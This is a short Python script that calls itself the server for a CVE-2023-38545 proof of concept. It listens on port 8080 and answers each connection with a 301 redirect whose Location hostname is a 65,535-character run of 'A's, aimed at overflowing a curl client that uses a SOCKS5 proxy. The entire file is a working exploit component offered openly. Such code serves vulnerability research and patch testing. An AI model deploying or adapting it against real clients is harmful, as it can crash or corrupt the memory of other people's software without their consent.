import socket
import threading
import logging
import argparse

# Initialize logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

def generate_string():
    logger.debug("[+] Generating payload string for HTTP redirection")
    payload = "A" * 65535
    return payload

def http_server():
    try:
        server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server_socket.bind(('0.0.0.0', 8080))
        server_socket.listen(5)
        logger.info("HTTP server running on port 8080")

        while True:
            client_socket, addr = server_socket.accept()
            logger.debug(f"[+] HTTP server received connection from {addr}")

            request = client_socket.recv(1024).decode('utf-8')
            logger.debug(f"[+] HTTP request: {request}")

            payload = generate_string()
            logger.debug("[+] Payload string generated")

            response = f"HTTP/1.1 301 Moved\r\nContent-Length: 0\r\nConnection: Close\r\nLocation: http://{payload}\r\n\r\n"
            logger.debug("[+] HTTP response generated")

            client_socket.sendall(response.encode('utf-8'))
            logger.debug(f"[+] HTTP response sent to client {addr}")

            client_socket.close()
    except Exception as e:
        logger.error(f"HTTP Server Error: {e}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Server for CVE-2023-38545 PoC")
    parser.add_argument("--debug", action="store_true", help="Enable debug logging")

    args = parser.parse_args()

    if args.debug:
        logger.setLevel(logging.DEBUG)

    http_thread = threading.Thread(target=http_server, daemon=True)
    http_thread.start()
    http_thread.join()
